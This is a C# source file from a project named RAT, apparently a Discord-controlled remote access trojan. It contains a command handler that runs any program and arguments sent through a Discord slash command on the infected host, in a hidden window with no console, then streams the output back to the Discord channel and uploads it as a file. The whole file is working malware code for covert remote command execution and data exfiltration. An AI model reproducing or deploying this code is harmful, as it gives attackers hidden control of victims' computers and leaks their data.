using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Discord;
using Discord.WebSocket;

namespace RAT;

internal partial class Commands
{
    public static async Task ExecuteOnShell(SocketSlashCommand cmdSket)
    {
        await cmdSket.DeferAsync();

        #region Program Args + Info

        string programArgs = "";
        string programName = cmdSket
            .Data
            .Options
            .ElementAt(1)
            .Value
            .ToString()!;

        if ((!programName.Contains('/') || !programName.Contains('\\')) && RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        {
            programName = "/usr/bin/" + programName;
        }

        try
        {
            programArgs = cmdSket
                .Data
                .Options
                .ElementAt(2)
                .Value
                .ToString()!;
        }
        catch
        {
            programArgs = "";
        }
        #endregion Program Args + Info

        EmbedBuilder e = new()
        {
            Title = "Shell Executor",
            Description = $"Executing '{programName}', with arguments \'{programArgs}\'..."
        };

        Process proc = new()
        {
            StartInfo = new()
            {
                FileName = programName,
                Arguments = programArgs,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            }
        };

        Thread watcher = new(async () =>
        {
            ulong stderrMsgId, stdoutMsgId;
            ISocketMessageChannel cnn = cmdSket.Channel;
            Stopwatch wtch = new();
            wtch.Start();
            try
            {
                bool success = proc.Start();

                if (!success)
                {
                    throw new Exception("The program did not start. Are you attempting to reference an already started process?");
                }
                await cmdSket.FollowupAsync(embed: e.Build());
                stderrMsgId = (await cnn.SendMessageAsync("`NOTE: Standard Error Output will be contained on this message!`\r\n\r\n")).Id;
                stdoutMsgId = (await cnn.SendMessageAsync("`NOTE: Standard Output will be contained on this message!`\r\n\r\n")).Id;

                StreamReader errOut = proc.StandardError, stdOut = proc.StandardOutput;
                StringBuilder
                    currOutputERR = new(),
                    currOutputOUT = new();

                do
                {
                    await Task.Delay(1000);
                    currOutputERR.Append(errOut.ReadToEnd());
                    currOutputOUT.Append(stdOut.ReadToEnd());

                    try
                    {
                        await cnn.ModifyMessageAsync(stderrMsgId, msgProps => msgProps.Embed = new EmbedBuilder() { Title = "Standard Error", Description = currOutputERR.ToString() }.Build());
                        await cnn.ModifyMessageAsync(stdoutMsgId, msgProps => msgProps.Embed = new EmbedBuilder() { Title = "Standard Output", Description = currOutputOUT.ToString() }.Build());
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"error sending message -> {ex}");
                    }
                }
                while (!proc.HasExited);
                StringBuilder final = new($"\t- Standard Output:\r\n{currOutputOUT}\r\n\r\n\t- Standard Error:\r\n{currOutputERR}");

                await cnn.SendMessageAsync($"Application Terminated with Exit Code `{proc.ExitCode}`, Processing Output...");

                string tFile = Path.GetTempFileName();
                string tFile2 = Path.GetTempPath() + $"{programName.Replace('/', '_').Replace('\\', '_')}_output.txt".ToLower();

                await File.WriteAllTextAsync(tFile, final.ToString(), Encoding.UTF8);

                File.Move(tFile, tFile2, true);

                await cnn.SendFileAsync(tFile2, text: "Output Attached.");

                File.Delete(tFile2);
            }
            catch (Exception ex)
            {
                await cmdSket.FollowupAsync($"Error Executing Program on Shell. -> **EXCEPTION**:\r\n```\r\n{ex}\r\n```\r\nProgram ran for {wtch.ElapsedMilliseconds}ms.");
            }
            finally
            {
                proc.Dispose();
            }
        })
        {
            Name = "Shell Watcher"
        };
        watcher.Start();
    }
}